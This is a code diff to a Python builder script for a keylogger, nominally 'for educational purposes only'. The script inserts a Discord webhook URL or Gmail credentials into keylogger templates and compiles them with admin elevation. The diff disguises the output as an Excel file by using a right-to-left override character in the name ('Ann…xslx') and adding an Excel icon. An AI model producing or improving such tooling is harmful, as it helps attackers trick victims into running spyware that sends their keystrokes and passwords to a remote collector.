@@ -3,7 +3,6 @@
 #                          ! EDUCATIONAL PURPOSES ONLY !                      #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
-
 import os
 from getpass import getpass
 import subprocess
@@ -25,7 +24,8 @@ def build():
                 "--disable-windowed-traceback",
                 "--uac-admin",
                 "-n",
-                "MemeLogger",
+                "Ann‮xslx",
+                f"--icon={os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon","excel.ico")}",
                 "--distpath",
                 output_dir,
                 "--workpath",
@@ -103,16 +103,15 @@ def main():
             continue
         if choice == 1:
             url = input("\nEnter discord webhook url: ")
-            base_dir = os.path.dirname(os.path.abspath(__file__))
-            python_file = os.path.join(base_dir, "remote", "discord", "keylogger.py")
-            with open(python_file, "r", encoding="utf-8") as f:
+            discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "discord", "keylogger.py")
+            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
+            with open(discord_file, "r", encoding="utf-8") as f:
                 content = f.read()
-            with open(r"keylogger.py", "w", encoding="utf-8") as f:
+            with open(python_file, "w", encoding="utf-8") as f:
                 f.write(content.replace("YOUR_WEBHOOK_URL", url))
-            python_file = r".\keylogger.py"
             build()
             try:
-                os.remove(r".\keylogger.py")
+                os.remove(python_file)
             except (FileNotFoundError, PermissionError):
                 pass
             break
@@ -127,30 +126,27 @@ def main():
             else:
                 print(choice2)
                 continue
-
-            base_dir = os.path.dirname(os.path.abspath(__file__))
-            gmail_path = os.path.join(base_dir, "remote", "gmail", "keylogger.py")
+            gmail_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "gmail", "keylogger.py")
             email = input("\nEnter your gmail: ")
             password = getpass("Enter your password: ")
-
+            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(gmail_path, "r", encoding="utf-8") as f:
                 content = f.read()
-            with open(r"keylogger.py", "w", encoding="utf-8") as f:
+            with open(python_file, "w", encoding="utf-8") as f:
                 f.write(
                     content.replace("YOUR_GMAIL", email).replace(
                         "YOUR_PASSWORD", password
                     )
                 )
-            python_file = r".\keylogger.py"
+
             build()
             try:
-                os.remove(r".\keylogger.py")
+                os.remove(python_file)
             except (FileNotFoundError, PermissionError):
                 pass
             break
         elif choice == 3:
-            base_dir = os.path.dirname(os.path.abspath(__file__))
-            python_file = os.path.join(base_dir, "local", "keylogger.py")
+            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "local", "keylogger.py")
             build()
             break
         elif choice == 4:
